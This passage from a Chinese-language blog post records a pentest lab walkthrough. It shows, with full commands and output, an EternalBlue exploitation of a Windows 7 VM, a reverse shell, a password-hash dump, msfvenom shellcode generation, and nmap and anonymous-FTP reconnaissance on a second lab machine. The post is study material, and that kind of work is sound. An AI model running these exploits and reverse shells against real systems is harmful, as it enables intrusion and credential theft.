(exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> rhosts 192.168.19.139**</span><br><span class="line">rhosts =&gt; 192.168.19.139</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **check** </span><br><span class="line"></span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.19.139   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic</span><br><span class="line">                                             s/using-metasploit.html</span><br><span class="line">   RPORT          445              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use <span class="keyword">for</span> authentication. Only affects Windows S</span><br><span class="line">                                             erver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote architecture matches exploit Target. Only affects Windows Serve</span><br><span class="line">                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  <span class="literal">true</span>             <span class="built_in">yes</span>       Check <span class="keyword">if</span> remote OS matches exploit Target. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **<span class="built_in">set</span> lhost eth0  <span class="comment">#設定IP也可以寫網卡名稱**</span></span><br><span class="line">lhost =&gt; 192.168.19.130</span><br></pre></td></tr></table></figure>
<ul>
<li>通過check也確認了目標機器的漏洞</li>
<li>成功利用該漏洞進行遠程登入</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.139:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.19.139:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.19.139:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.19.139:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.19.139:445 - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] 192.168.19.139:445 - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] 192.168.19.139:445 - CORE raw buffer dump (38 bytes)</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.19.139:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service </span><br><span class="line">[*] 192.168.19.139:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          </span><br><span class="line">[+] 192.168.19.139:445 - Target <span class="built_in">arch</span> selected valid <span class="keyword">for</span> <span class="built_in">arch</span> indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.19.139:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.19.139:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.19.139:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.19.139:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.19.139:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.19.139:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.19.139:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.19.139:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.19.139:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.19.139:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.19.139:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.19.139</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.139:49162) at 2024-02-14 21:39:34 -0500</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.19.139:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **hashdump** </span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::**</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::</span><br><span class="line">**user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  換個攻擊方式，使用以下payload試試</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/3ndG4me/AutoBlue-MS17-010</span><br><span class="line">Cloning into <span class="string">&#x27;AutoBlue-MS17-010&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 145, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (69/69), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (30/30), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 145 (delta 52), reused 43 (delta 39), pack-reused 76</span><br><span class="line">Receiving objects: 100% (145/145), 105.75 KiB | 993.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (86/86), <span class="keyword">done</span>.</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> AutoBlue-MS17-010 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# **pip install -r requirements.txt** </span><br><span class="line">Requirement already satisfied: impacket <span class="keyword">in</span> /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)</span><br><span class="line">Requirement already satisfied: dsinternals <span class="keyword">in</span> /usr/lib/python3/dist-packages (from impacket-&gt;-r requirements.txt (line 1)) (1.2.4)</span><br><span class="line">WARNING: Running pip as the <span class="string">&#x27;root&#x27;</span> user can result <span class="keyword">in</span> broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python eternal_checker.py 192.168.19.139</span><br><span class="line">[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">[!] The target is not patched</span><br><span class="line">=== Testing named pipes ===</span><br><span class="line">[*] Done</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# <span class="built_in">cd</span> shellcode        </span><br><span class="line">                                                                                                                                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span><br><span class="line">└─# ./shell_prep.sh</span><br><span class="line">                 _.-;;-._</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-;;-._|</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|   ||   |</span><br><span class="line">          <span class="string">&#x27;-..-&#x27;</span>|_.-<span class="string">&#x27;&#x27;</span>-._|   </span><br><span class="line">Eternal Blue Windows Shellcode Compiler</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s compile them windoos shellcodezzz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Compiling x64 kernel shellcode</span></span><br><span class="line"><span class="string">Compiling x86 kernel shellcode</span></span><br><span class="line"><span class="string">kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)</span></span><br><span class="line"><span class="string">Y</span></span><br><span class="line"><span class="string">LHOST for reverse connection:</span></span><br><span class="line"><span class="string">**192.168.19.130**</span></span><br><span class="line"><span class="string">LPORT you want x64 to listen on:</span></span><br><span class="line"><span class="string">**9999**</span></span><br><span class="line"><span class="string">LPORT you want x86 to listen on:</span></span><br><span class="line"><span class="string">**2222**</span></span><br><span class="line"><span class="string">Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Type 0 to generate a staged payload or 1 to generate a stageless payload</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">Generating x64 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=9999**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x64 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 511 bytes</span></span><br><span class="line"><span class="string">Saved as: **sc_x64_msf.bin**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Generating x86 cmd shell (staged)...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.19.130 LPORT=2222**</span></span><br><span class="line"><span class="string">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></span><br><span class="line"><span class="string">[-] No arch selected, selecting arch: x86 from the payload</span></span><br><span class="line"><span class="string">No encoder specified, outputting raw payload</span></span><br><span class="line"><span class="string">Payload size: 375 bytes</span></span><br><span class="line"><span class="string">Saved as: sc_x86_msf.bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MERGING SHELLCODE WOOOO!!!</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]</span></span><br><span class="line"><span class="string">└─# cd ..          </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span></span><br><span class="line"><span class="string">└─# ./listener_prep.sh</span></span><br><span class="line"><span class="string">  __</span></span><br><span class="line"><span class="string">  /,-</span></span><br><span class="line"><span class="string">  ||)</span></span><br><span class="line"><span class="string">  \\_, )</span></span><br><span class="line"><span class="string">   `--&#x27;</span></span><br><span class="line">Eternal Blue Metasploit Listener</span><br><span class="line"></span><br><span class="line">LHOST <span class="keyword">for</span> reverse connection:</span><br><span class="line">**192.168.19.130**</span><br><span class="line">LPORT <span class="keyword">for</span> x64 reverse connection:</span><br><span class="line">**9999**</span><br><span class="line">LPORT <span class="keyword">for</span> x86 reverse connection:</span><br><span class="line">**2222**</span><br><span class="line">Enter 0 <span class="keyword">for</span> meterpreter shell or 1 <span class="keyword">for</span> regular cmd shell:</span><br><span class="line">**1**</span><br><span class="line">Type 0 <span class="keyword">if</span> this is a staged payload or 1 <span class="keyword">if</span> it is <span class="keyword">for</span> a stageless payload: 0</span><br><span class="line">Starting listener (staged)...</span><br><span class="line">Starting postgresql (via systemctl): postgresql.service.</span><br><span class="line">Metasploit tip: To save all commands executed since start up to a file, use the </span><br><span class="line">makerc <span class="built_in">command</span></span><br><span class="line">                                                  </span><br><span class="line"> ______________________________________</span><br><span class="line">/ it looks like you<span class="string">&#x27;re trying to run a \                                                                                                                     </span></span><br><span class="line"><span class="string">\ module                               /                                                                                                                     </span></span><br><span class="line"><span class="string"> --------------------------------------                                                                                                                      </span></span><br><span class="line"><span class="string"> \                                                                                                                                                           </span></span><br><span class="line"><span class="string">  \                                                                                                                                                          </span></span><br><span class="line"><span class="string">     __                                                                                                                                                      </span></span><br><span class="line"><span class="string">    /  \                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    @  @                                                                                                                                                     </span></span><br><span class="line"><span class="string">    |  |                                                                                                                                                     </span></span><br><span class="line"><span class="string">    || |/                                                                                                                                                    </span></span><br><span class="line"><span class="string">    || ||                                                                                                                                                    </span></span><br><span class="line"><span class="string">    |\_/|                                                                                                                                                    </span></span><br><span class="line"><span class="string">    \___/                                                                                                                                                    </span></span><br><span class="line"><span class="string">                                                                                                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.3.55-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span></span><br><span class="line"><span class="string">+ -- --=[ 9 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit Documentation: https://docs.metasploit.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Processing config.rc for ERB directives.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; use exploit/multi/handler</span></span><br><span class="line"><span class="string">[*] Using configured payload generic/shell_reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/x64/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LHOST 192.168.19.130</span></span><br><span class="line"><span class="string">LHOST =&gt; 192.168.19.130</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 9999</span></span><br><span class="line"><span class="string">LPORT =&gt; 9999</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set ExitOnSession false</span></span><br><span class="line"><span class="string">ExitOnSession =&gt; false</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set EXITFUNC thread</span></span><br><span class="line"><span class="string">EXITFUNC =&gt; thread</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 0.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set PAYLOAD windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">PAYLOAD =&gt; windows/shell/reverse_tcp</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; set LPORT 2222</span></span><br><span class="line"><span class="string">LPORT =&gt; 2222</span></span><br><span class="line"><span class="string">resource (config.rc)&gt; exploit -j</span></span><br><span class="line"><span class="string">[*] Exploit running as background job 1.</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:9999 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP handler on 192.168.19.130:2222 </span></span><br><span class="line"><span class="string">msf6 exploit(multi/handler) &gt;</span></span><br></pre></td></tr></table></figure>
<p>  當全部設定好然後運行指令進行攻擊後會看到受害機…</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]</span><br><span class="line">└─# python3 eternalblue_exploit7.py 192.168.19.139 shellcode/sc_all.bin</span><br><span class="line">shellcode size: 2307</span><br><span class="line">numGroomConn: 13</span><br><span class="line">Target OS: Windows 7 Ultimate 7601 Service Pack 1</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">SMB1 session setup allocate nonpaged pool success</span><br><span class="line">good response status: INVALID_PARAMETER</span><br></pre></td></tr></table></figure>
<p>  <img src="/img/privilege_Untitled.png" alt="Untitled"></p>
<ul>
<li>該攻擊會讓受害機器無法正常運作，不要隨意進行攻擊!</li>
</ul>
</li>
</ul>
<h3 id="Set-Up-Academy"><a href="#Set-Up-Academy" class="headerlink" title="Set Up - Academy"></a><strong>Set Up - Academy</strong></h3><p>login &gt; root</p>
<p>passwd &gt; tcm</p>
<p>原本在嘗試用 <code>kali</code> 進行 <code>arp-scan -l</code> 時，無法找到目標機器的網路位址</p>
<p>在看了這台機器ip後，它沒有被分配到IP位置</p>
<p><img src="/img/privilege_Untitled_1.png" alt="Untitled"></p>
<p>該機器網路是靜態模式的網卡，不主動向伺服器獲取IP地址，在目標機器上執行該指令</p>
<p>需要使用 <code>dhclient</code> 動態獲取或釋放IP位置</p>
<ul>
<li><code>dhclient -r</code> &gt; 釋放IP</li>
<li><code>dhclient</code> &gt; 取得IP</li>
<li><code>dhclient eth0</code> &gt; 續訂主乙太網路設備的動態分配IP位址</li>
</ul>
<p>但重開機要再重新下一次指令</p>
<p><img src="/img/privilege_Untitled_2.png" alt="Untitled"></p>
<p>ip : 192.168.19.141 &gt; 這樣kali已經能arp-scan -l 找到這台機器了</p>
<p>按照慣例一樣先找port有開的服務</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p-** 192.168.19.141</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 11:20 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.141</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">**21/tcp open  ftp     vsftpd 3.0.3**</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.19.130</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">**22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)</span><br><span class="line">|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)</span><br><span class="line">|_  256 99:9c:39:11:<span class="built_in">dd</span>:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)</span><br><span class="line">**80/tcp open  http    Apache httpd 2.4.38 ((Debian))**</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">MAC Address: 00:0C:29:AC:4E:32 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 5.0 - 5.5</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.44 ms 192.168.19.141</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.22 seconds</span><br></pre></td></tr></table></figure>

<p>看到ssh &gt; 嘗試像root的使用者名稱或密碼進行登入</p>
<ul>
<li><p>弱密碼</p>
</li>
<li><p>看看client端是否能檢測到你再進行的登入動作，尤其是在爆破時</p>
</li>
<li><p>除了被偵測到，是否有被抵擋發送大量請求的行為</p>
</li>
<li><p>有沒有留下log登入紀錄</p>
</li>
<li><p>默認Apache網頁所帶來的危害</p>
<p>  <img src="/img/privilege_Untitled_3.png" alt="Untitled"></p>
<ul>
<li>發生在web跟api應用程式的攻擊技術</li>
<li>資料蒐集的一環</li>
<li>提供有關web伺服器的訊息</li>
<li>存在隱藏目錄位置</li>
<li>用於識別伺服器的漏洞並規劃攻擊</li>
<li>列舉伺服器上執行的應用程式和服務</li>
<li>識別web伺服器設定中的弱點</li>
<li>取得並對應用程式、資料庫、內部網路的存取權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                   危害</span><br><span class="line">                    |</span><br><span class="line">     ---------------------------------</span><br><span class="line">    |               |                 |</span><br><span class="line">   敏感           安全漏洞           隱私泄露</span><br><span class="line">  資訊外洩       揭示系統漏洞       個人資料曝光</span><br><span class="line">    |               |                 |</span><br><span class="line"> 未授權訪問      破壞數據完整性       用戶追蹤</span><br><span class="line">  敏感文件      網站被入侵者操控     第三方跟蹤</span><br><span class="line">    |               |</span><br><span class="line">登錄信息泄露    安全漏洞被利用</span><br><span class="line">                    |</span><br><span class="line">              網站崩潰或服務中斷</span><br></pre></td></tr></table></figure>
</li>
<li><p>ftp在nmap中發現可以用Anonymous進行登入</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ftp 192.168.19.141**</span><br><span class="line">Connected to 192.168.19.141.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.19.141:kali): **Anonymous**</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; **<span class="built_in">ls</span>**</span><br><span class="line">229 Entering Extended Passive Mode (|||36525|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; **get note.txt**</span><br><span class="line"><span class="built_in">local</span>: note.txt remote: note.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||54067|)</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> note.txt (776 bytes).</span><br><span class="line">100% |*********************************************************************************|   776        1.36 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">776 bytes received <span class="keyword">in</span> 00:00 (428.14 KiB/s)</span><br></pre></td></tr></table></figure>

<ul>
<li>也許這note.txt是存在於apache網頁後的某個目錄中，只是我們並不知道，但是通過ftp發現了這個檔案</li>
<li>儘管檔案不是直接放在apache網頁目錄後，也可以從中取得一些訊息<ul>
<li>apache 2.4.38</li>
<li>debian</li>
</ul>
</li>
</ul>
<p><img src="/img/privilege_Untitled_4.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **<span class="built_in">cat</span> note.txt** </span><br><span class="line">Hello Heath !</span><br><span class="line">Grimmie has setup the <span class="built_in">test</span> website <span class="keyword">for</span> the new academy.</span><br><span class="line">I told him not to use the same password everywhere, he will change it ASAP.</span><br><span class="line"></span><br><span class="line">I couldn<span class="string">&#x27;t create a user via the admin panel, so instead I inserted **directly into the database** with the following command:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES</span></span><br><span class="line"><span class="string">(&#x27;</span>10201321<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>cd73502828457d15655bbd7a63fb0bc8<span class="string">&#x27;, &#x27;</span>Rum Ham<span class="string">&#x27;, &#x27;</span>777777<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;, &#x27;</span>7.60<span class="string">&#x27;, &#x27;</span>2021-05-29 14:36:56<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;);**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The **StudentRegno number** is what you use for login.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Le me know what you think of this open-source project, it&#x27;</span>s from 2020 so it should be secure... right ?</span><br><span class="line">We can always adapt it to our needs.</span><br><span 